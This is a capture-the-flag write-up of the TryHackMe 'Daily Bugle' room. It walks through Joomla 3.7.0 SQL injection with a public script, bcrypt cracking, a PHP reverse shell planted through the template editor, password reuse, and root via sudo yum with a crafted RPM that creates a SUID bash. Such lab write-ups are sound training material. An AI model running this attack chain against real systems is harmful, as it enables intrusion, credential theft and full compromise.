---
author: northmatrix
categories:
  - tryhackme
media_subpath: /assets/img/rooms/daily-bugle
math: false
comments: true
image:
  path: /daily-bugle-banner.png
  alt: Logo of the daily bugle newspaper
title: Daily Bugle
tags:
  - sqli
  - rev-shell
  - cms
date created: 2025‑07‑09 22:55:04 +01:00
date modified: 2025‑07‑14 20:18:34 +01:00
---

## Overview

Daily Bugle is a Spider-Man-themed TryHackMe room where the objective is to gain root access to a target server running a vulnerable Joomla CMS. The challenge focuses on web enumeration, CMS exploitation, and privilege escalation.

![](daily-bugle-card.png)

## Enumeration

As always i begin by running an nmap scan against the target machine specifying that all ports should be scanned and to run the  
scan at *insane* speed using the full TCP handshake.

```bash
root@ip-10-10-133-82:~# nmap -sT -T5 -p- 10.10.161.54
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-09 02:11 BST
Nmap scan report for ip-10-10-161-54.eu-west-1.compute.internal (10.10.161.54)
Host is up (0.0010s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:0C:2B:1C:10:E5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.21 seconds
```

Here we can see a SSH service running this is running on all CTF machines so is nothing out of the ordinary we can also see a webserver running on port 80 and a MySQL database running on port 3306. Visiting the web server on port 80 gives us our first flag.

Now onto the next part of the CTF visiting port 3306 seems to be a dead as we are not allowed to connect to it so we will concentrate on the webserver. Lets begin by running a directory scan using gobuster.

```bash
root@ip-10-10-133-82:~# gobuster dir -u http://10.10.161.54/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.161.54/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.161.54/administrator/]
/bin                  (Status: 301) [Size: 232] [--> http://10.10.161.54/bin/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.161.54/cache/]
/cgi-bin/             (Status: 403) [Size: 210]
/components           (Status: 301) [Size: 239] [--> http://10.10.161.54/components/]
/images               (Status: 301) [Size: 235] [--> http://10.10.161.54/images/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.161.54/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.10.161.54/language/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.161.54/layouts/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.161.54/libraries/]
/index.php            (Status: 200) [Size: 9278]
/media                (Status: 301) [Size: 234] [--> http://10.10.161.54/media/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.161.54/modules/]
/plugins              (Status: 301) [Size: 236] [--> http://10.10.161.54/plugins/]
/robots.txt           (Status: 200) [Size: 836]
/templates            (Status: 301) [Size: 238] [--> http://10.10.161.54/templates/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.161.54/tmp/]
Progress: 4655 / 4656 (99.98%)
===============================================================
Finished
===============================================================
```

Additionally we will also see if we can get more information from nmap using the `-A` flag. For an aggressive scan.

```bash
root@ip-10-10-133-82:~# nmap -sT -T5 -p 80 -A  10.10.161.54
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-09 02:19 BST
Nmap scan report for ip-10-10-161-54.eu-west-1.compute.internal (10.10.161.54)
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
MAC Address: 02:0C:2B:1C:10:E5 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (99%), Linux 3.8 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms ip-10-10-161-54.eu-west-1.compute.internal (10.10.161.54)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.01 seconds

```

We now know that Joomla is being used although the answer did hint at this. Anyway we can now attempt to enumerate the version of Joomla being used to do this i first tried using scripts offered by nmap but they did not provide any useful information. Eventually i found a Joomla enumeration script called *juumla* which worked. I downloaded it from the git repo <https://github.com/000pp/juumla> and ran it using the python interpreter specifying the target url.

```bash
root@ip-10-10-133-82:~# python3 main.py  -u http://10.10.161.54
jUuMlA - 0.1.6
most overrated joomla scanner

[+] Connected successfully to http://10.10.161.54/administrator/
[!] Checking if target is running Joomla...

[!] Running Joomla version scanner! (1/3)
[+] Joomla version is: 3.7.0

[!] Running Joomla vulnerabilities scanner! (2/3)
[+] Joomla! Core 1.5.0 - 3.9.4 - Directory Traversal / Authenticated Arbitrary File Deletion
[+] Joomla! Core 3.9.1 - Persistent Cross-Site Scripting in Global Configuration Textfilter Settings
[+] Joomla! 3.7 - SQL Injection
[!] Vulnerabilities scanner finished! (2/3)

[!] Running backup and config files scanner! (3/3)
[!] Backup and config files scanner finished! (3/3)
root@ip-10-10-133-82:~/juumla# 
```

From this we can see that we are running version *3.7.0* this is the second answer in the room also.

## Exploitation

After doing a bit of research on the Joomla 3.7.0 SQL Injection vulnerability i found a github repository containing an exploit that could be run. I cloned this repo and ran it specifying the target machine. From this i was able to extract a user record from the users table.

```bash
root@ip-10-10-133-82:~# python3 joomblah.py http://10.10.151.89
   
   .---.    .-'''-.        .-'''-.                                                           
   |   |   '   _    \     '   _    \                            .---.                        
   '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
   .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
   |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
   |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
   |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
   |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
   |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
   |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
__.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4***********.******.*********.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

Now that we have this information we can attempt to crack the hash. This will allow us to access the Joomla administration page.  
Using the `hashinator` command i was able to find that the it is a *bcrypt* hash. This type of hash is designed to be resistant to GPU attacks so we might as well use john the ripper for this.

> The correct password was quite a bit into the wordlist so it may take a while to crack the hash.  
{:.prompt-info }

```bash
root@ip-10-10-133-82:~# john --format=bcrypt --wordlist=/usr/share/wordlists/rockyoumini.txt main.hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sp*******123     (?)
1g 0:00:00:30 DONE (2025-07-09 12:57) 0.03267g/s 60.00p/s 60.00c/s 60.00C/s tiffany3..spider123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we know the password and can login to the Joomla administration page this password is also one of the answers in the room. Now that I have access to the Admin page I began looking for ways to upload my own PHP script i eventually found out that i was able to abuse the templating system in order to upload my own PHP script that would be run by the server. I used pentest monkeys PHP reverse shell as my revshell payload in this room and replaced the index.php with the reverse shell.

![Joomla Template](joomla-template-page-reverse-shell.png)

Anyway after uploading this script and then visiting the index.php page the server then reached out to a netcat listener that i had setup listening on port 1234. From here i followed by usual steps to get an interactive shell specifically.

```bash
CTRL+Z
stty raw -echo
fg
export TERM=xterm
stty rows 40 columns 120
```

## Privilege Escalation

Anyway running whoami shows that i am the apache. Initially i began looking around the filesystem to see if there were any incorrectly configured permissions but could not find any. I also could not find any immediately obvious privileged escalation paths such as SUID or cronjobs. So i began looking deeper into the directory that i already had permission to view in particular `/var/www/html` here i found a PHP file `configuration.php` containing the password for the MySQL database. I was able to use this password to login to the `jjameson` user account.

After gaining access to this account i was able to view the flag located in the users home directory additionally i checked to see if i had permission to run any commands with sudo. Doing so i see that i am able to run the `yum` command looking this up on gtfobins i was able to see that i could exploit it with a specially crafted rpm package.

Below is the rpm package i created with `fpm` i set up a simple python http server on my host and downloaded it to the target machine.

```bash
TF=$(mktemp -d)
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > $TF/x.sh
chmod +x $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Now all i had to do is use yum to install the package which created a bash shell with SUID bit set in `/tmp/rootbash`

```bash
sudo yum localinstall -y x-1.0-1.noarch.rpm
```

Running `./rootbash -p` from within `/tmp` directory gives us a root shell and i can now read the flag located in the users root directory.
